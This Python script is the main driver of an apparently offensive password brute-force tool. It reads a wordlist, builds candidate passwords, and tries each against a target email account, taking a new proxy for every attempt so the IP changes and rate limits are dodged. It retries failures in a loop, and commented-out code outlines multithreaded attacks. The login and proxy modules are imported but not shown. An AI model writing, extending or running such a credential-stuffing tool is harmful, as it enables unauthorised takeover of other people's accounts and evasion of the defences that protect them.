from concurrent.futures import ThreadPoolExecutor
from make_proxy import make_proxy
from make_combs import make_combs
from try_password import try_password
import argparse

def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument('-f', '--file', required=True, help='(str) specify path to .txt containing lines with potential passwords')
    parser.add_argument('-t', '--target', required=True, help='(str) target email')
    parser.add_argument('-p', '--passwords', required=True, help='(bool) hide or show passwords in output')
    parser.add_argument('-w', '--workers', required=False, help='(int) how many threadpoolexecutor workers to use')
    args = parser.parse_args()

    GLOB_HIDE = args.passwords
    GLOB_WORKERS = args.workers
    GLOB_TARGET = args.target
    GLOB_FILE = args.file


    passwords = make_combs(GLOB_FILE)
    ip, port = make_proxy()

#    with ThreadPoolExecutor(max_workers=GLOB_WORKERS) as exe:
#        for password in passwords:
#            exe.submit(try_password, <target>, password, ip, port)

    for password in passwords:
        while True:
            try:
                ip, port = make_proxy()
                try_password(GLOB_TARGET, password, ip, port, GLOB_HIDE)
            except Exception as e:
                print(f"(main): {e}")
                continue
            else:
                break

    return 0


if __name__ == "__main__":
    exit(main())
